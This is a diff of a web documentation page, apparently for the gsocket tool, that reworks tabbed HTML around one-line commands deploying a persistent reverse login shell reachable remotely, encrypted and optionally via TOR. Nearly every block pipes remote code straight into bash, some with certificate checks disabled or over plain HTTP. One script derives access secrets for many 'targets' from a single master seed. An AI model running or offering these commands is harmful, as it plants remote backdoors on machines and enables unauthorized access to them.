@@ -6,47 +6,40 @@ layout: default
 
 <p class="panel-note2" markdown="1">Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like.</p>
 
-
-
-> _This must be the quickest way to access a system_
->                                                 -- anonymous
+> _This must be the quickest way to access a system_ -- anonymous
 
 Use either one of these two commands to _install_:
 
-<div class="tabs-container">
+<!-- This is obviously the tabs wrapper -->
+<div class="tabs-wrapper">
+    <!-- And here the tabs container -->
     <div class="tabs">
+        <!-- This is the first tab -->
         <div class="tab">
             <!-- "checked" means active tab -->
-            <input type="radio" name="css-tabs-dl" id="curl-dl" class="tab-switch" checked>
+            <input type="radio" name="css-tabs-install" id="curl-install" class="tab-switch" checked>
             <!-- This is the tab selector -->
-            <label for="curl-dl" class="tab-label">Curl</label>
+            <label for="curl-install" class="tab-label">Curl</label>
             <!-- This is the tab content container -->
             <div class="tab-content">
-                <!-- This is an attempt to reproduce syntax highlighting -->
-                <div class="language-shell highlighter-rouge">
-                    <div class="highlight">
-                        <pre class="highlight"><code>
-                        bash -c "$(curl -fsSL gsocket.io/x)"
-                        </code></pre>
-                    </div>
-                </div>
-            </div>
-        </div>
-        <div class="tab">
-            <input type="radio" name="css-tabs-dl" id="wget-dl" class="tab-switch">
-            <label for="wget-dl" class="tab-label">Wget</label>
-            <div class="tab-content">
-                <pre><code class="shell">
-                bash -c "$(wget --no-verbose -O- gsocket.io/x)"
-                </code></pre>
-            </div>
-        </div>
-        <div class="tab">
-            <input type="radio" name="css-tabs-dl" id="test-dl" class="tab-switch">
-            <label for="test-dl" class="tab-label">Test</label>
-            <div class="tab-content">
+<!--
+This is how to reproduce the syntax highlighting with "rouge"
+You must respect this weird placement to avoid extra rendered space
+See here for more details:
+https://jekyllrb.com/docs/liquid/tags/#code-snippet-highlighting
+-->
 {% highlight shell %}
 bash -c "$(curl -fsSL gsocket.io/x)"
+{% endhighlight %}
+            </div>
+        </div>
+        <!-- This is the second tab -->
+        <div class="tab">
+            <input type="radio" name="css-tabs-install" id="wget-install" class="tab-switch">
+            <label for="wget-install" class="tab-label">Wget</label>
+            <div class="tab-content">
+{% highlight shell %}
+bash -c "$(wget --no-verbose -O- gsocket.io/x)"
 {% endhighlight %}
             </div>
         </div>
@@ -54,20 +47,54 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 </div>
 
 Use either one of these two commands to _uninstall_:
-```shell
+
+<div class="tabs-wrapper">
+    <div class="tabs">
+        <div class="tab">
+            <input type="radio" name="css-tabs-uninstall" id="curl-uninstall" class="tab-switch" checked>
+            <label for="curl-uninstall" class="tab-label">Curl</label>
+            <div class="tab-content">
+{% highlight shell %}
 GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
-```
-```shell
+{% endhighlight %}
+            </div>
+        </div>
+        <div class="tab">
+            <input type="radio" name="css-tabs-uninstall" id="wget-uninstall" class="tab-switch">
+            <label for="wget-uninstall" class="tab-label">Wget</label>
+            <div class="tab-content">
+{% highlight shell %}
 GS_UNDO=1 bash -c "$(wget --no-verbose -O- gsocket.io/x)"
-```
+{% endhighlight %}
+            </div>
+        </div>
+    </div>
+</div>
 
 Use either command to _access_ the remote host:
-```shell
+
+<div class="tabs-wrapper">
+    <div class="tabs">
+        <div class="tab">
+            <input type="radio" name="css-tabs-access" id="curl-access" class="tab-switch" checked>
+            <label for="curl-access" class="tab-label">Curl</label>
+            <div class="tab-content">
+{% highlight shell %}
 S="ExampleSecretChangeMe" bash -c "$(curl -fsSL gsocket.io/x)"
-```
-```shell
+{% endhighlight %}
+            </div>
+        </div>
+        <div class="tab">
+            <input type="radio" name="css-tabs-access" id="wget-access" class="tab-switch">
+            <label for="wget-access" class="tab-label">Wget</label>
+            <div class="tab-content">
+{% highlight shell %}
 S="ExampleSecretChangeMe" bash -c "$(wget --no-verbose -O- gsocket.io/x)"
-```
+{% endhighlight %}
+            </div>
+        </div>
+    </div>
+</div>
 
 <p class="panel-note2" markdown="1">This is just one of many GSOCKET examples. More on [GitHub]({{site.github.repository_url}}).</p>
 
@@ -88,29 +115,50 @@ Log in to the host from your workstation
 {: refdef}
 
 Ignore SSL / Certificate warnings:
-```shell
+
+<div class="tabs-wrapper">
+    <div class="tabs">
+        <div class="tab">
+            <input type="radio" name="css-tabs-ignore" id="curl-ignore" class="tab-switch" checked>
+            <label for="curl-ignore" class="tab-label">Curl</label>
+            <div class="tab-content">
+{% highlight shell %}
 bash -c "$(curl -fsSLk gsocket.io/x)"
-```
-```shell
+{% endhighlight %}
+            </div>
+        </div>
+        <div class="tab">
+            <input type="radio" name="css-tabs-ignore" id="wget-ignore" class="tab-switch">
+            <label for="wget-ignore" class="tab-label">Wget</label>
+            <div class="tab-content">
+{% highlight shell %}
 bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
-```
+{% endhighlight %}
+            </div>
+        </div>
+    </div>
+</div>
 
 Deploy with a predefined secret:
+
 ```shell
 X=ExampleSecretChangeMe bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 
 Deploy with *curl* and fallback to *wget*:
+
 ```shell
 command -v curl >/dev/null && bash -c "$(curl -fsSL gsocket.io/x)" || bash -c "$(wget --no-verbose -O- gsocket.io/x)"
 ```
 
 Deploy with a predefined secret. Try *curl* and fallback to *wget*:
+
 ```shell
 X=ExampleSecretChangeMe && (command -v curl >/dev/null && X=$X bash -c "$(curl -fsSL gsocket.io/x)" || X=$X bash -c "$(wget --no-verbose -O- gsocket.io/x)")
 ```
   
 Deploy from self-extracting shell-script [deploy-all.sh](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh) without fetching any packages and using good old plain HTTP:
+
 ```
 wget --no-hsts http://nossl.segfault.net/deploy-all.sh && \
 bash ./deploy-all.sh
@@ -133,6 +181,7 @@ Useful environment variables:
 If all fails:
 
 Download the static binary from [https://github.com/hackerschoice/binary/tree/main/gsocket/bin](https://github.com/hackerschoice/binary/tree/main/gsocket/bin) (likely [gs-netcat_x86_64-alpine.tar.gz](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz)) and extract and start gs-netcat manually:
+
 ```shell
 curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
 SECRET=$(/bin/gs-netcat -g)
@@ -145,6 +194,7 @@ echo "Connect with: gs-netcat -s $SECRET -i"
 {: refdef}
 
 Remembering many secrets from many deployments is cumbersome. It is easier to remember just one MASTER-SEED and derive the SECRET from the target's hostname. The following script generates a secure SECRET based on a single MASTER-SEED and the target's hostname.
+
 ```sh
 # cut & paste this into your shell on your workstation or add to ~/.bashrc
 gssec()
@@ -170,6 +220,3 @@ ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
 ```
 
 <p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>
-
-
-
